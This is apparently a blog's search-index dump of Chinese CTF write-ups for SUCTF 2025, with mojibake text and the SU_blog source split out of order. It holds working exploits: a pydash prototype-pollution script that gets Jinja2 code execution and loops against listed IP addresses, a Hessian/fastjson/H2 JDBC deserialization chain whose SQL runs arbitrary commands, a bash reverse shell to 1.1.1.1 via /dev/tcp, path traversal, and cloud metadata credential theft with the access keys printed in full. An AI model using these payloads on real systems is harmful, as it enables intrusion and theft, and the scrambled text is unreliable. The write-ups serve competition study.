\u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) 